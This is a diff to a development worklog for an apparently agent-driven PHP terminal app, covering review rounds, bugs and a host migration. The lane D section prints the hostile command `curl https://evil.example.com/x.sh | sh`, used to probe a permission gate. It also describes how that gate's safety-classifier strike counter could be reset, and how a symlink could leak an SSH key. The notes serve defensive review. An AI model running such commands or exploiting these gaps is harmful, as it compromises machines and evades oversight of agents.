@@ -1232,6 +1232,62 @@ under the old bootstrap) — and that is exactly how GitHub Actions runs it.
 shortest-reach of the four policy files.
 **#77** policy-file guards are case-sensitive (APFS/Windows); `sudo -E` now
 hard-fails (right direction, bad message).
+**#78** four `tests/McpClientTest.php` cases spawn a child that **exits
+immediately** (`/bin/true`, `echo`) as their fake MCP server, then write the
+129-byte `initialize` handshake to its stdin — a pure kernel race. Won it: `OK
+(18 tests)`. Lost it: `fwrite(): Write of 129 bytes failed with errno=32 Broken
+pipe` notice at `src/McpClient.php:170`, then `$written === false` throws at
+:173. Three back-to-back runs of the untouched file went OK → error → OK, and it
+reproduces in a standalone `php -r` with `proc_open('true')` and **zero
+sugar-crush code loaded**. Fix is a child that stays alive (`cat`, `sleep`).
+**#79** `/workflow run` **freezes the TUI**. `Chat.php:3727` calls
+`WorkflowEngine::run()` synchronously inside `Chat::update()`, i.e. on the
+ReactPHP loop, and `executeStage()` → `AgentWorkerPool::executeOne()` →
+`ProcessExecutor::execute()` is a blocking `stream_select` until the worker
+finishes or `SubAgent::$timeout` (default **300s**) expires — no repaint, no
+keystrokes, no spinner, and `workflows/deep-research.php` is a 5-stage pipeline.
+Created by P2.3: the path existed but could not be entered from the TUI before.
+The repo already has the shape of the answer in `EngineBackend::completeAsync()`
+(fork+socket). Deliberately NOT bundled into #13 — its own change-set.
+
+**#80** `ProcessExecutor::createInlineWorkerScript()`
+(`src/Agents/ProcessExecutor.php:507-643`) is **still the P1.S5 simulation** — the
+worker echoes `[name] Task finished: <task>` and never makes a provider request.
+So a workflow stage does not reach a live model, and no tool call exists on the
+pool path for a `PermissionGate` to evaluate. Found while fixing #13's false
+gate claim; it is the reason threading the gate could not by itself make that
+claim true. Documented as a README limitation pending its own change-set.
+
+**#81** port the vhs lexical grammar into `candy-vcr/src/Tape/Lexer.php`.
+Upstream `vhs` is a transitional dependency — `candy-vcr` is meant to replace it
+outright — but CI still renders the ~49-lib matrix with upstream (the
+`vhs-runner` image in `.github/workflows/vhs.yml`), with candy-vcr as a
+candy-core-only soak. Lane B derived the real token model from
+`/home/my/go/pkg/mod/github.com/charmbracelet/vhs@v0.11.0`
+(`lexer.go`/`token.go`/`parser.go`), and candy-vcr's lexer currently has
+**neither a JSON token nor a regex token** — the two constructs behind rounds
+10/11's three false greens. That knowledge is the spec candy-vcr needs, so it
+must be recorded portably rather than spent on assertions.
+
+Related trap, flagged to lane B: assertions that hold only because *upstream* is
+the renderer must be **labelled**, never removed. `Set Shell` is the clear case —
+a candy-vcr concept that upstream validates against nine fixed keys, where `sh`
+is a hard error aborting the whole job (which is why the escape cases weaponise
+it). Forbidding it in a tape is right today and wrong the day candy-vcr takes
+over. Whoever flips the renderer needs to tell "this rule exists because of
+upstream" from "this rule is a real contract of ours".
+
+**#82** `src/Tui/Components/MenuBar.php:362-368` has the same orphaned-docblock
+defect lane E fixed in `Renderer.php`: `activateMenu()`'s docblock sits above the
+*next* method's docblock, and `activateMenu()` (`:469`) has none. Pre-existing and
+unrelated to P8.2, so lane E left it rather than add diff noise. Two instances of
+one defect means it is worth a grep across the lib, not a second point fix.
+
+Worth recording *why* the zero-stage reachability test could not see #79: zero
+stages means zero blocking work. The test is honest about dispatchability
+(`run()` really is reachable from `Chat::update()`) and blind to everything
+inside the loop, because `foreach ($workflow->stages …)` iterates zero times.
+A reachability test proves the door opens, not that the room is habitable.
 
 ## Method notes that paid this session
 
@@ -1249,6 +1305,41 @@ hard-fails (right direction, bad message).
 - **Do the cheap closing fixes in-context rather than spawning an agent.** Lane
   A's blocker was a fully-specified comment rewrite; doing it directly saved a
   round-trip and the reviewer had already supplied the measured replacement.
+- **A sandbox with a symlinked `vendor/` tests the ORIGINAL code.** Lane E's
+  reviewer sabotaged a label and got 52/52 green — because composer's PSR-4 map
+  in the symlinked `vendor/` resolved `SugarCraft\Crush\*` back to the **real
+  repo `src`**, so the mutation was never loaded. It only caught this because
+  the green looked wrong. Two guards, both now mandatory for sabotage work:
+  prepend a sandbox autoloader and assert the class file resolves inside the
+  sandbox, and `cmp`/md5 every mutation for having actually changed bytes. The
+  byte-guard has now paid twice — lane B's 81-mutation sweep reported 1 NO-OP
+  (`agents.tape` Height→380 on a file already at 380) that would otherwise have
+  read as a survived mutation.
+- **A read-only reviewer should open with an `md5sum` baseline it can later
+  `md5sum -c`.** Lane E's reviewer finished with two FAILED lines and was able to
+  prove they were the concurrent workflow lane's writes, not its own — by diffing
+  hunk ranges, showing zero overlap with its own subject, and `cmp`-ing the
+  current file against the snapshot its probes ran against so its cited line
+  numbers stayed valid. Without the baseline that is an argument; with it, it is
+  a check.
+- **Ten rounds of black-box probing beat one look for the source.** Lane B spent
+  rounds 1-9 inferring vhs's lexer from `vhs validate` yes/no answers, each round
+  finding exactly one more unmodelled construct. Round 10 found the Go source
+  sitting on this box at
+  `/home/my/go/pkg/mod/github.com/charmbracelet/vhs@v0.11.0`, copied
+  `lexer/lexer.go` + `token/token.go` + `parser/parser.go` into a scratch module,
+  built a token+command dumper, and found **three** false greens in one pass.
+  Before probing a black box, check whether the box is actually open — a module
+  cache, a vendor dir, a `-dev` package.
+- **A probe's domain silently bounds its conclusion, and that is where sweeps
+  lie.** Two instances, one round apart. Round 9's `#`-protection sweep used the
+  same character as opener AND closer, so `{a#b{` had no `}`, `readJSON` ate to
+  EOF along with the sentinel, and `{` scored as "does not protect `#`" — the
+  64,009 opener/closer *pair* sweep found it immediately. Round 9's keyword sweep
+  generated every **CamelCase** word, a domain that cannot produce `em`/`px`/`ms`
+  /`s`/`m`/`true`/`false`, so "53 keywords, no 54th to miss" was wrong about a
+  list of 60 — while its own probe detected all seven. Both times the probe was
+  fine and the *domain* was the bug, which is invisible in a green result.
 - Derive a fact from the **binary/source**, never from the project's own docs —
   both of vhs's shipped keyword lists were incomplete, and the repo's README and
   help screen have each been found stale.
@@ -1274,4 +1365,424 @@ skipped, exit 0**.
 **Open work order from here:** finish #37 (lane B) → #13/#38 (lanes D/E) → #63
 `enforceTimeLimit` (small, protects every future lane; hold until no lane is
 running the sugar-crush suite) → #12/#14/#17 rest of Phase 2 → #64 → the P3-P8
-body → #58/#59/#60/#61, #49, #51, #55, and the new #74-#77.
+body → #58/#59/#60/#61, #49, #51, #55, and the new #74-#78.
+
+## Client kill, 2026-08-17 ~01:50 — nothing lost
+
+The client process was killed with all three lanes mid-run. Recovery worked
+because each lane's work was already **on disk** and each agent's full reasoning
+was in its own transcript under `subagents/agent-<id>.jsonl`; replacements were
+spawned pointed at those transcripts rather than re-briefed from scratch. Lane B
+had additionally taken its own `md5sum` baseline at start and verified the tree
+byte-identical against it, which is what made "the reviewer changed nothing"
+checkable rather than assumed. **Worth repeating: a read-only reviewer should
+open with a baseline it can later `md5sum -c`.** The one hazard found was lane E
+dying between an `Edit` to `tests/Renderer/KeyHelpTest.php` and the `sed -i` that
+followed it — a half-applied pair is exactly where a broken file hides, so the
+replacement was told to treat that file as suspect rather than as working.
+
+# Session 2026-08-17 — three lanes through review/fix cycles, two crashes, a host migration
+
+Nothing committed this session beyond the worklog itself. The three lanes below
+are **uncommitted in the working tree** and each is mid-review. Read the "State
+right now" section at the bottom first if resuming cold.
+
+## Lane D — #13 (P2.3 workflow wiring): three fix rounds, two of them fixing the
+## previous round's own defect
+
+**Round 1 (implementation).** `Bootstrap::workflowEngine()` constructs the engine
+from the launch's provider/model; `WorkflowEngine` gained `model`/`provider`
+constructor params replacing `'claude-sonnet-4-6'`/`'anthropic'` at all six
+`new Agent(...)` sites; `WorkflowRegistry` gained a `?string
+$projectWorkflowsPath` second tier (project wins), `.yaml`-only by construction
+so a cloned repo cannot turn `/workflow run <name>` into arbitrary code
+execution; full YAML shape validation replacing a raw `TypeError`.
+
+It also self-reported the thing its own tests could not see: every existing
+reachability test drove `/workflow list`, and **`list` never calls the engine**.
+It added a test driving a real `KeyMsg(Enter)` through `Bootstrap::chat()` to
+`WorkflowResult`.
+
+**Round 1's review — 9 findings + 6 nits.** The headline: a security property
+asserted in two places and established in none. Both `WorkflowRegistry`'s
+docblock and the README said a workflow's tasks *"run through the same
+`PermissionGate` that a typed delegation would"* — the entire justification for
+letting a cloned repository define a workflow. Traced: every `SubAgent` built
+with `permissionGate` omitted; `AgentManager::evaluateToolCalls()` returns
+immediately on null; the two paths workflows actually use (`executeAll()` and
+`pool->executeOne()`) never reach it; and `createSubAgent()`, the only place a
+gate is ever attached, has **zero production callers** — so the comparison
+target did not exist either.
+
+Two more that only became reachable *because* of the wiring: `/workflow run`
+reset `Program`'s SIGINT handler to `SIG_DFL` permanently (so a later `kill
+-INT` skips PHP shutdown and leaves the terminal raw inside the alt screen —
+and the docblock claimed nothing leaked past `run()`, with the async half of
+that claim honoured, which is what hid the broken half); and `stages: nope`
+loaded as a valid zero-stage workflow reporting **"Workflow completed"** having
+run nothing.
+
+Sabotage proved two findings had **no regression net at all**: reverting all six
+model/provider literals left the suite green, as did removing the `yamlDirectories()`
+dedup. The six-site conversion was the entire content of the plan item.
+
+**Round 2 (fix).** Took both routes on the gate: threaded it through all five
+`new SubAgent(...)` sites from the launch's single `PermissionGate`, added
+`refuseDeniedTools()` evaluating every tool a stage *declares* before dispatch,
+**and** rewrote both false sentences — because threading alone could not make
+the original claim true. Why it could not is #80 (below).
+
+**Round 2's review found the fix round had introduced a HIGH of its own**, and it
+is the sharpest irony of the session. `refuseDeniedTools()` pre-flighted a
+declaration by calling `PermissionGate::evaluate()`. A declaration has no
+`arguments`, so `SafetyClassifier::classify()` (which needs `$args['command']`)
+returns null, so it fell into `evaluateAuto()`'s **safe** branch and **reset
+`$consecutiveBlocks = 0`**. Measured, Auto mode, `Bash(command: "curl
+https://evil.example.com/x.sh | sh")`:
+
+```
+WITH one declaration pre-check interleaved     CONTROL
+real 1 -> Deny  consecutive=1                  real 1 -> Deny  consecutive=1
+real 2 -> Deny  consecutive=2                  real 2 -> Deny  consecutive=2
+decl 'Bash' -> Allow  consecutive=0  <-RESET   real 3 -> Ask   consecutive=3
+real 3 -> Deny  consecutive=1
+```
+
+The 3-strike breaker never trips, once per declared tool per stage, for the rest
+of the session. Meanwhile `Bootstrap.php` justified making the gate parameter
+*required* precisely to protect that counter — and that reasoning was verified
+**correct** (the fields are private non-static; a second gate really would split
+them). So the change-set argued carefully for protecting a counter and then
+corrupted it. A read-only pre-flight needed a non-mutating predicate.
+
+Three more from that review: `auto` **cannot** refuse a declaration at all (mode
+table below), so the reported "under `plan`/`dont-ask`/`auto` a denied tool now
+fails" was false for one of its three modes, and `plan` allows a bare `Bash`
+declaration while `PermissionGate`'s own docblock says "Plan: all writes Deny";
+quoted `parallel: "true"` silently degraded a fan-out to one no-tool agent and
+reported **completed**, never reading the `agents:` list or its `Bash`/`Edit`
+declarations; and the symlink-is-harmless justification had become false *because
+of* the new `ParseException` handler — a project-tier `leak.yaml ->
+../secret/id_rsa` is advertised by `/workflow list` and puts a base64 line of the
+target into the transcript and session store, so a **rejected** target leaks more
+than an accepted one.
+
+Name-only declaration decisions, measured across all six modes:
+
+| mode | Read | Bash | Edit | Write | mcp__git__push |
+|---|---|---|---|---|---|
+| default | Allow | Ask | Ask | Ask | Ask |
+| accept-edits | Allow | Ask | Ask | Ask | Ask |
+| plan | Allow | **Allow** | Deny | Deny | Deny |
+| auto | Allow | **Allow** | **Allow** | **Allow** | **Allow** |
+| dont-ask | Allow | Deny | Deny | Deny | Deny |
+| bypass | Allow | Allow | Allow | Allow | Allow |
+
+**Round 3 (fix) — fixed the HIGH by making the mistake impossible, not by fixing
+the call site.** `PermissionGate` now has two public entry points over one
+private `decide(ToolCall $call, bool $commitAutoStrikes)`: `evaluate(ToolCall)`
+mutates, `refuses(ToolDeclaration): bool` does not, and the Auto arm is the only
+branch between them. The confusion-proofing is **type-level**: new
+`src/Permissions/ToolDeclaration.php` deliberately has **no `toToolCall()`` — its
+converter is `asNamedCallForGateOnly()`, marked `@internal` — and
+`testTheTwoEntryPointsDoNotAcceptEachOthersArgument()` asserts the parameter
+types reflectively, so "simplifying" `refuses()` back to a `ToolCall` fails the
+suite. Live probe now reproduces the control column: `Deny, Deny, refuses=false,
+**Ask**`.
+
+On D2 it **declined to invent a policy**: `auto` genuinely cannot refuse a bare
+name (the classifier judges arguments), so rather than fabricate a rule it
+disclosed the gap as structural in three places and pinned the matrix as a data
+provider cross-checked against `evaluate()`. A fabricated refusal rule would
+have been a policy change disguised as a safety fix.
+
+D3 took **both** halves: `realpath()` containment on project-tier symlinks
+applied by the *identical* predicate in `baseNames()` and `load()`/`loadYaml()`
+(user tier left unconfined — it is the tier whose `.php` files get `require`d),
+**and** the parser message withheld regardless, keeping only `is not valid YAML
+(line N)`. D4 refuses a non-boolean `parallel` rather than coercing. D5 added
+`array_is_list()`. N-b lifted the pre-check to a whole-workflow pre-flight before
+`installInterruptHandlers()`; N-d turned `$previousSignalHandlers` into a
+push/pop stack. 21/21 sabotage cases red.
+
+**Round 3 also found that round 2's D3b test did not bite.** Round 2's own
+battery had printed `D3b parser message put back : GREEN — TEST DOES NOT BITE` —
+the fixture's sentinel sat on a line the YAML parser does not quote, so the test
+passed whether or not the leak was fixed. The repaired fixture was on disk and
+**never re-verified** when the host died. That is the third test in this session
+found to pass on sabotaged input.
+
+## Lane E — #38 (P8.2 in-app keybinding reference)
+
+Registry-driven so help text and routing cannot drift: `KeyBinding` +
+`KeyBindingRegistry`, with `KeyboardHandler`'s two claim sets **derived from the
+registry** (replacing the `SHELL_CTRL_RUNES`/`CHAT_CTRL_RUNES` consts), `?` bound
+only on an empty input line, and a Veil overlay.
+
+**The implementation round found two defects in its own predecessor's work.**
+First, **the drift test did not bite**: every observation constructed its own
+`KeyMsg`, so the registry's `keys` *label* — the only part a user reads — was
+never exercised, and sabotaging `chat.palette` `Ctrl+P`→`Ctrl+X` left **52/52
+green**. Fixed by driving each row from its own label; extending that to the
+`(or …)` asides immediately caught a live doc bug (`(or j / k)` beside `↑ / ↓`
+told the user `j` moves **up**). Second, an **over-wide frame line at `rows ≤ 4`**
+— 77 columns on a 44-column terminal — root-caused to a `max(2, rows - 4)` floor
+letting the overlay reach the status-bar row, where Veil composites without
+truncating and the status bar is not width-truncated. Removing the floors was
+right rather than raising them.
+
+**Its review confirmed both fixes hold** (11,700 reflection-driven renders, cols
+1–130 × rows 1–45, at top and clamped-to-end scroll: 0 width and 0 height
+violations; 850 composited combos including 1×1; `HAND_DRIVEN` proven un-abusable)
+and then found **the regression the good change had caused**: deriving the claim
+sets added `r` to `chatCtrlRunes()`, and the docblock claimed that changed "the
+one case" while measurement showed three. The consequential one — `Ctrl+R` in
+`Pane::Agents` opens Chat's session picker *underneath* the full-pane agent
+dashboard, where `↑/↓/Enter` are claimed by `handleAgentViewKey()`, so the modal
+can be neither moved nor committed. Previously a silent no-op. Plus: the
+overlay-chain precedence comment was **inverted** (the reference is routed
+**first** at 707 and painted **last** at 847 — the opposite of the invariant the
+other three overlays are justified by), with the change-set's own test asserting
+the forbidden state and its docblock repeating the false claim.
+
+**The fix round** declared the exception **in the registry** rather than beside
+it (`yieldsToShellReason` + `chatCtrlRunesYieldedToShell()`), added
+`KeyboardHandler::shellOwnsKeyboard(App)` as a named predicate that also
+**replaces claim rules 2/3/3b** so `claims()` and `chatOwns()` read one rule, and
+stated the real criterion honestly — *not* "opens a Chat overlay" (`Ctrl+P` does
+too and is excluded, because `Ctrl+K` in `Pane::Agents` is a shell chord
+`consumeShellCmd()` translates into a `Ctrl+P` fed to the hosted Chat, so
+refusing it would remove one of two doors, not the room). For Decision B it kept
+routing and **reordered the chain to match**, with a bonus: `renderKeyHelp()`
+first means it runs every frame, structurally killing the stale-ceiling nit. It
+also made all four `(or k / j)` rows direction-sensitive (three of four had
+passed when reverted individually, because wrapping list handlers make "up from
+0" satisfy `assertNotSame`), fixed `overlay()`'s box extractor (the old one read
+**8 rows vs the real 23** at 80×24, making the height guard vacuous at every
+realistic width), and gave the open-but-unpaintable state a status-bar cue.
+
+It wrote a wrong count itself (52/56) and **its own new shape test caught it**
+during a sabotage run — evidence the guard works.
+
+## Lane B — #37 (VHS tapes + examples): rounds 8→11, and the oracle change
+
+The chain: rounds 1–4 fixed column anchoring, multi-directive lines, joined
+quoted args, and values continuing across lines; round 7 replaced all of it with
+a whole-file token stream; round 8 found `/` opens a regex (three of four
+`#`-protecting characters modelled).
+
+**Round 10 changed the oracle and that is the lesson.** Nine rounds inferred the
+lexer from `vhs validate`'s yes/no answers. Round 10 found the vhs v0.11.0 **Go
+source** on the box, copied `lexer.go`/`token.go`/`parser.go` into a scratch
+module, built a token+command dumper, and found **three** false greens in one
+pass: the `{`…`}` **JSON token** (asymmetric closer, *not* newline-bounded, so
+`Set WaitPattern {#} Set Shell "sh"` hides a render-aborting directive and also
+hides `Source`, defeating the escape hatch `testNoTapeSourcesAnotherFile` exists
+to close); **backslash escapes inside a regex** (odd run escapes the delimiter —
+`/a\/#b/` and the realistic `/https:\/\/x#y/`); and **a backslash before a
+newline carrying a regex across the line**, because `readRegex`'s escape branch
+`continue`s past the `isNewLine` break.
+
+**Round 11 fixed all three and found two more mechanisms unprompted**: an
+upstream **panic** (an open regex with a trailing backslash run at EOF slices
+past `len(input)` → exit 2; measured on `/a\`, `/a\\`, `/a\\\`, not on `/a`,
+`/a/`, `/a\ `, `/a\`+newline), and **a comment as a setting's value** —
+`parseSet` reads `p.peek.Literal` ungated, so `Set Theme #Dracula` really sets
+`Dracula` and `Set Shell #sh` really aborts the render.
+
+On the "N places over-approximate" sentence it made the right structural call.
+That sentence had been falsified three times (two → three → wrong again), so
+instead of writing a fourth count it changed **form**: derivation + oracle +
+named exceptions, **no count**, resting on `parseType`/`parseCopy` looping on
+`token.STRING` and `parseSet` taking exactly one token — both re-checkable in
+`parser.go`. And `KEYWORDS` is no longer a swept list but **the map
+`LookupIdentifier` consults**, so completeness is by construction rather than by
+sweep. First round in twelve whose correctness argument does not depend on a
+sweep having had the right domain.
+
+It left the differential harness behind with its numbers — 73,920 generated
+tapes, 24,846 parsing clean, **0 miss-direction divergences against the fixed
+model and 156 against a reconstructed round-9 model** — specifically so a rebuild
+scoring 0 against *both* is recognisable as broken rather than as passing.
+
+**On the candy-vcr point** (raised mid-session by the user): upstream vhs is a
+**transitional** dependency and candy-vcr is meant to replace it outright, but CI
+still renders the ~49-lib matrix with upstream while candy-vcr is a
+candy-core-only non-blocking soak. Round 11 verified the successor's behaviour
+from `candy-vcr/src/Tape/` **source** rather than assuming, and documented that
+`Set Shell "sh"` is **legal** there (`Compiler` records the name,
+`TapeToGif::resolveShell()` prefers `--shell`, `FrameStream` runs it under a PTY)
+— so the day candy-vcr renders, these lexer regression tests need a different
+sentinel. `GRID_ROWS_BY_HEIGHT` is labelled *unverified-post-switch* rather than
+wrong, since those rows were measured in upstream's headless browser. Nothing
+weakened, nothing removed. See **#81**.
+
+## The transferable lessons this session
+
+- **A probe's domain silently bounds its conclusion, and a green result cannot
+  show you the domain was wrong.** Two instances one round apart. Round 9's
+  `#`-protection sweep used the same character as opener AND closer, so `{a#b{`
+  had no `}`, `readJSON` ate to EOF along with the sentinel, and `{` scored as
+  "does not protect `#`" — the 64,009 opener/closer **pair** sweep found it
+  immediately. Round 9's keyword sweep generated every **CamelCase** word, a
+  domain that structurally cannot produce `em`/`px`/`ms`/`s`/`m`/`true`/`false`,
+  so "53 keywords, no 54th to miss" was wrong about a list of **60** — while its
+  own probe would have detected all seven. Both times the probe was correct.
+- **Before probing a black box, check whether the box is open.** Ten rounds of
+  inference lost to a Go module cache nobody looked in.
+- **A sandbox with a symlinked `vendor/` tests the ORIGINAL code.** Lane E's
+  reviewer sabotaged a label and got 52/52 green because composer's PSR-4 map in
+  the symlinked `vendor/` resolved `SugarCraft\Crush\*` back to the real repo
+  `src`. Mandatory now: prepend a sandbox autoloader and assert
+  `ReflectionClass::getFileName()` resolves inside the sandbox.
+- **md5/`cmp`-guard every mutation for having actually changed bytes.** Paid
+  twice: lane B's 81-mutation sweep reported 1 NO-OP (`agents.tape` Height→380 on
+  a file already at 380) that would otherwise have read as a survived mutation.
+- **A read-only reviewer should open with an `md5sum` baseline it can later
+  `md5sum -c`.** Lane E's reviewer finished with FAILED lines and *proved* they
+  were a concurrent lane's writes — by hunk-range diffing, by `cmp`-ing the
+  current file against the snapshot its probes ran on (so its line citations
+  stayed valid), and by naming a reviewed file it predicted would **not** change
+  (`CommandRegistry.php`) as the control. Predicting the control is the strong
+  part.
+- **Three separate tests were found passing on sabotaged input** (lane E's drift
+  test, lane D's D3b leak test, lane D's six-literal conversion). Sabotage is not
+  optional garnish; it is the only thing that distinguishes a test from a
+  comment.
+- **Fixing a comment is a change, and a fix round is exactly where new false
+  claims get written.** Lane D's round 2 existed to make false comments true and
+  introduced a HIGH plus three new false claims. Review fix rounds as hard as
+  implementations.
+- **A reviewer overriding its brief is signal, not disobedience.** Lane B's
+  round-9 agent re-ran a sweep I told it not to, because the docblock states
+  "exactly four of 94" and a number it writes is a number it measured. It was
+  right. Separately, the second probe form I supplied was **invalid** — vhs
+  echoes the offending source line, so any sentinel in the tape self-matches, and
+  its first attempt scored 35 false hits before it noticed.
+
+## New tracker items filed this session
+
+**#78** four `tests/McpClientTest.php` cases spawn a child that exits immediately
+(`/bin/true`, `echo`) as a fake MCP server, then write the 129-byte `initialize`
+handshake to its stdin — a kernel race. Lost: `fwrite(): … errno=32 Broken pipe`
+notice at `src/McpClient.php:170`, then `$written === false` throws at :173.
+Three back-to-back runs of the untouched file went OK → error → OK, and it
+reproduces in a standalone `php -r` with `proc_open('true')` and zero sugar-crush
+code loaded. Fix: a child that stays alive (`cat`, `sleep`).
+
+**#79** `/workflow run` **freezes the TUI**. `Chat.php` calls
+`WorkflowEngine::run()` synchronously inside `Chat::update()`, i.e. on the
+ReactPHP loop, and `executeStage()` → `AgentWorkerPool::executeOne()` →
+`ProcessExecutor::execute()` is a blocking `stream_select` until the worker
+finishes or `SubAgent::$timeout` (default **300s**) expires — no repaint, no
+keystrokes, no spinner; `workflows/deep-research.php` is a 5-stage pipeline.
+Created by P2.3: the path existed but could not be entered from the TUI before.
+The answer's shape already exists in `EngineBackend::completeAsync()`
+(fork+socket). Deliberately NOT bundled into #13.
+
+**#80** `ProcessExecutor::createInlineWorkerScript()`
+(`src/Agents/ProcessExecutor.php:507-643`) is **still the P1.S5 simulation** — the
+worker echoes `[name] Processing: <task>`, heartbeats, then `complete` with
+`output: "[name] Task finished: <task>"`, `tokensUsed: 0`, `costUsd: 0.0`. No
+provider request, no HTTP, no tool call. Independently confirmed twice. So a
+workflow stage does not reach a live model, and **no tool call exists on the pool
+path for a `PermissionGate` to evaluate** — which is why threading the gate could
+not by itself make #13's gate claim true. Documented as a README limitation.
+
+**#81** port the vhs lexical grammar into `candy-vcr/src/Tape/Lexer.php`, which
+today is line-oriented with **no JSON token and no regex token** — i.e. vulnerable
+to all five `#`-hiding constructs. The grammar was derived from the Go source this
+session; record it portably rather than spending it on assertions. Related trap:
+assertions that hold only because *upstream* is the renderer must be **labelled**,
+never removed.
+
+**#82** `src/Tui/Components/MenuBar.php:362-368` has the same orphaned-docblock
+defect lane E fixed in `Renderer.php` — `activateMenu()`'s docblock sits above the
+*next* method's docblock and `activateMenu()` (`:469`) has none. Two instances of
+one defect means a grep across the lib, not a third point fix.
+
+## Two client crashes and a host migration
+
+**Crashes at ~01:50 and ~04:00** killed all three lanes mid-run. Recovery worked
+both times because each lane's work was already **on disk** and each agent's
+reasoning was in `subagents/agent-<id>.jsonl`; replacements were spawned pointed
+at those transcripts rather than re-briefed from scratch.
+
+Hazards the crashes exposed, now folded into every brief:
+- A killed agent can leave a **sabotage mutation applied to the real tree**. Lane
+  E's reviewer was mid-mutation on `src/Chat.php` (wheel sign flip) when the
+  second crash hit. It happened to have been restored — verified `:2483` holds the
+  original `- $notch`, everything lints, no `.bak`/`.sabbak`/`.orig` — but relying
+  on that is luck. Sabotage in the real lib dir now requires a **trap that runs on
+  abnormal exit**.
+- A **half-applied Edit/`sed -i` pair** is where a broken file hides, and `php -l`
+  cannot see a logically unfinished edit.
+- **Unbounded backgrounded pollers outlive their agent** and produce a run of
+  completion notifications with no payload. The tell is a summary repeating
+  numbers already reported. Bound every poll.
+
+**Host migration.** The old server died of memory exhaustion under concurrent
+agents; the repo and `~/.claude` were copied to a new box. What survived: the
+repo (all 35 uncommitted lane files, git at `72c14eb4`) and all three agent
+transcripts. What did not, and what was done:
+
+- **`/usr/local/bin/vhs` gone.** Rebuilt from source; the binary now lives at
+  **`/tmp/vhsbin/vhs`** (`vhs version v0.11.0`, `validate` clean).
+- **The vhs Go source was gone.** Restored with `go mod download
+  github.com/charmbracelet/vhs@v0.11.0` → back at
+  `/home/my/go/pkg/mod/github.com/charmbracelet/vhs@v0.11.0`. Go 1.26.1 present.
+- **All `/tmp` scratchpads gone** — lane B's differential harness and lane E's
+  mutation harness must be rebuilt from transcripts.
+- **PHP extensions missing**, which blocked everything. `dom`/`xmlwriter`/
+  `simplexml`/`xmlreader` (PHPUnit would not start at all), then `sqlite3` +
+  `pdo_sqlite` (**389** errors: `Class "SQLite3" not found` ×111, `PDOException:
+  could not find driver` ×278), then `gd` (**5** errors,
+  `imagecreatetruecolor()`). Installed as identified.
+- **Still absent and expected to stay so:** `ext-uv` (so `Loop::get()` returns
+  `StreamSelectLoop` and the loop pins committed in `76f34813` are inert here —
+  harmless, but that timing work cannot be reproduced on this box), and
+  `ttyd`/`ffmpeg` (so vhs cannot *render*; `validate` and the parser work, which
+  is all a lexing question needs).
+- **No network and no provider credentials** here, so ~27 skips versus 1 on the
+  old host, plus one integration failure — `cURL error 7: Failed to connect to
+  localhost port 30000`, `connection refused`, `provider 'openai' … requires
+  'apiKey'`.
+
+**Consequence for anyone reading old numbers in this file: every suite figure
+above was measured on the dead host.** Re-establish a baseline before calling
+anything a regression, and judge a sabotage by whether *the specific test that
+should catch it* flips green→red, not by a diff of suite totals — the
+environmental errors swamp totals.
+
+## State right now
+
+**In flight (3 lanes, all mid-review, nothing committed):**
+
+- **Lane D / #13** — review of fix round 3. Priority is the `refuses()` /
+  `ToolDeclaration` type-level guard: whether any mutable state is still touched
+  on the read-only path, whether `asNamedCallForGateOnly()` (`@internal` is
+  documentation, not enforcement) can be reached from a declaration, and whether
+  the two entry points genuinely share one decision.
+- **Lane E / #38** — review of its fix round. Priority is whether replacing claim
+  rules 2/3/3b with `shellOwnsKeyboard()` moved routing in an unprobed state
+  (this lane has changed routing twice while fixing something else), and whether
+  reordering the chain can leave a **pending permission prompt invisible**.
+- **Lane B / #37** — round-12 review. Priority is the corpus **domain**: what a
+  6×8×22×7×5 product cannot contain (nested constructs, two constructs on one
+  line, `\r\n`, non-ASCII, three-line constructs, multiple sentinels, empty
+  middles), since domain bugs are how this chain's sweeps failed twice.
+
+**Uncommitted tree:** lane B's four untracked tapes + four untracked examples +
+`tests/VhsTapeContractTest.php` + modified `.vhs/chat.tape`; lane D's
+`src/Permissions/ToolDeclaration.php`, `tests/Permissions/PermissionGateDeclarationTest.php`,
+`tests/Workflows/WorkflowFailureReportingTest.php` and modifications to
+`PermissionGate.php`/`WorkflowEngine.php`/`WorkflowRegistry.php`/`WorkflowResult.php`/
+`Bootstrap.php`; lane E's `src/Commands/KeyBinding.php`, `KeyBindingRegistry.php`,
+`tests/Commands/KeyBinding*`, `tests/Renderer/KeyHelpTest.php` and modifications
+to `Chat.php`/`Renderer.php`/`KeyboardHandler.php`/`CommandRegistry.php`. Both
+lanes D and E have hunks in `src/Chat.php` and `README.md` — verified
+non-overlapping.
+
+**Work order from here:** land #37/#13/#38 → #63 `enforceTimeLimit` (hold until no
+lane is running the suite) → #12/#14/#17 rest of Phase 2 → #64 → the P3-P8 body →
+#58/#59/#60/#61, #49, #51, #55, and #74-#82.
